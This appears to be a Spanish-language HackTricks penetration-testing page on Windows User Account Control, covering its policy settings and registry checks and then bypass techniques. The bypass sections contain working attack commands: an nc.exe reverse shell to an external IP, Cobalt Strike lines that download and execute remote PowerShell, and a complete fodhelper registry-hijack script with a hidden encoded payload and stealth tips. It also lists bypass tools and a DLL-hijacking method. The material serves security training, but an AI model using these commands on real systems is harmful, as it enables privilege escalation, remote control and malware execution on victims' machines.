# UAC - Control de cuentas de usuario

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **aviso de consentimiento para actividades con privilegios elevados**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administrativa** a menos que un administrador autorice explícitamente que estas aplicaciones/tareas tengan acceso con nivel de administrador para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.

Para más información sobre los niveles de integridad:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está activo, a un usuario administrador se le asignan 2 tokens: uno con privilegios de usuario estándar, para realizar acciones regulares a nivel normal, y otro con privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica cómo funciona UAC en profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico a su organización a nivel local (usando secpol.msc), o configurarlo y desplegarlo vía Group Policy Objects (GPO) en un entorno de Active Directory. Las distintas configuraciones se tratan en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona detalle adicional:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                               |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                               |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios que no son de Windows |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el escritorio seguro               |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado en Home) Deshabilitado (predeterminado en Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                               |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                   |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                   |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                   |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                   |

### UAC Bypass Theory

Algunos programas se **autoelevan automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifests**_ la opción _**autoElevate**_ con valor _**True**_. El binario también tiene que estar **firmado por Microsoft**.

Muchos procesos auto-elevados exponen **funcionalidad vía objetos COM o servidores RPC**, que pueden invocarse desde procesos que se ejecutan con integridad media (privilegios a nivel de usuario normal). Nota que COM (Component Object Model) y RPC (Remote Procedure Call) son métodos que usan los programas de Windows para comunicarse y ejecutar funciones entre procesos diferentes. Por ejemplo, **`IFileOperation COM object`** está diseñado para manejar operaciones de archivos (copiar, eliminar, mover) y puede autoelevar privilegios sin mostrar un aviso.

Ten en cuenta que se pueden realizar algunas comprobaciones, como verificar si el proceso se ejecutó desde el directorio **System32**, lo cual puede omitirse por ejemplo **inyectando en explorer.exe** u otro ejecutable ubicado en System32.

Otra forma de sortear estas comprobaciones es **modificar el PEB**. Cada proceso en Windows tiene un Process Environment Block (PEB), que incluye datos importantes sobre el proceso, como su ruta ejecutable. Al modificar el PEB, los atacantes pueden falsificar (spoofear) la ubicación de su propio proceso malicioso, haciendo que parezca ejecutarse desde un directorio de confianza (como system32). Esta información falsificada engaña al objeto COM para autoelevar privilegios sin pedir confirmación al usuario.

Entonces, para **eludir** el **UAC** (elevar de nivel de integridad **medium** a **high**) algunos atacantes usan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un **proceso con nivel de integridad alto**.

Puedes **comprobar** el _**Manifest**_ de un binario usando la herramienta _**sigcheck.exe**_ de Sysinternals. (`sigcheck.exe -m <file>`) Y puedes **ver** el **nivel de integridad** de los procesos usando _Process Explorer_ o _Process Monitor_ (de Sysinternals).

### Comprobar UAC

Para confirmar si UAC está habilitado haz:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`** entonces UAC está **activado**, si es **`0`** o no existe, entonces UAC está **inactivo**.

Luego, comprueba **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Si **`0`**, entonces UAC no pedirá confirmación (como **desactivado**)
- Si **`1`** se le **pide al administrador nombre de usuario y contraseña** para ejecutar el binario con privilegios elevados (on Secure Desktop)
- Si **`2`** (**Notificarme siempre**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con privilegios elevados (on Secure Desktop)
- Si **`3`** como `1` pero no es necesario en Secure Desktop
- Si **`4`** como `2` pero no es necesario en Secure Desktop
- Si **`5`**(**predeterminado**) solicitará al administrador que confirme la ejecución de binarios no pertenecientes a Windows con privilegios elevados

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
Si el valor es **`0`**, entonces solo el usuario **RID 500** (**built-in Administrator**) puede realizar **tareas de administrador sin UAC**, y si es `1`, **todas las cuentas dentro del grupo "Administrators"** pueden hacerlo.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
Si **`0`** (predeterminado), la cuenta **built-in Administrator** puede realizar tareas de administración remota y si **`1`** la cuenta built-in Administrator **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté establecido en `1`.

#### Summary

- Si `EnableLUA=0` o **no existe**, **no hay UAC para nadie**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`, no hay UAC para nadie**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, no hay UAC para RID 500 (Built-in Administrator)**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**

Toda esta información puede recopilarse usando el módulo **metasploit**: `post/windows/gather/win_privs`

También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Tenga en cuenta que si tiene acceso gráfico a la víctima, UAC bypass es muy sencillo ya que simplemente puede hacer clic en "Yes" cuando aparezca el UAC prompt

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

Es importante mencionar que es **mucho más difícil eludir el UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### UAC deshabilitado

Si el UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**) puedes **execute a reverse shell with admin privileges** (nivel de integridad alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** Básico UAC "bypass" (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que pertenece al grupo Administrators puedes **mount the C$** compartido vía SMB (sistema de archivos) local como una nueva unidad y tendrás **access to everything inside the file system** (incluso la carpeta de inicio de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel de seguridad máximo.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** de la **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varios exploits de bypass de UAC. Tenga en cuenta que necesitará **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitará saber **cuál necesita.**\
Debe **tener cuidado** porque algunos bypasses **harán que otros programas muestren avisos** que **alertarán** al **usuario** de que algo está ocurriendo.

UACME tiene la **versión de build desde la cual cada técnica empezó a funcionar**. Puede buscar una técnica que afecte a sus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) obtienes la versión de Windows `1607` a partir de los números de compilación.

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario confiable `fodhelper.exe` se autoeleva en Windows modernos. Al ejecutarse, consulta la ruta de registro por usuario que aparece a continuación sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso de Medium Integrity (el usuario está en Administrators) inicie un proceso de High Integrity sin mostrar un UAC prompt.

Ruta del registro consultada por fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Pasos de PowerShell (set your payload, then trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/permisivo (no Always Notify con restricciones adicionales).
- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.

#### Más sobre UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass con GUI

Si tienes acceso a una **GUI puedes simplemente aceptar el UAC prompt** cuando lo recibas; realmente no necesitas un bypass. Por lo tanto, obtener acceso a una GUI te permitirá bypassear el UAC.

Además, si obtienes una sesión GUI que alguien estaba usando (potencialmente vía RDP) hay **algunas herramientas que se estarán ejecutando como administrator** desde las cuales podrías **run** un **cmd** por ejemplo **as admin** directamente sin que UAC vuelva a solicitarlo, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto puede ser un poco más **stealthy**.

### Noisy brute-force UAC bypass

Si no te importa ser ruidoso siempre podrías **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

Si miras **UACME** notarás que **la mayoría de los UAC bypasses abusan de una vulnerabilidad Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Otra técnica de UAC bypass

Consiste en observar si un **autoElevated binary** intenta **read** desde el **registry** el **name/path** de un **binary** o **command** a ser **executed** (esto es más interesante si el binary busca esta información dentro de **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
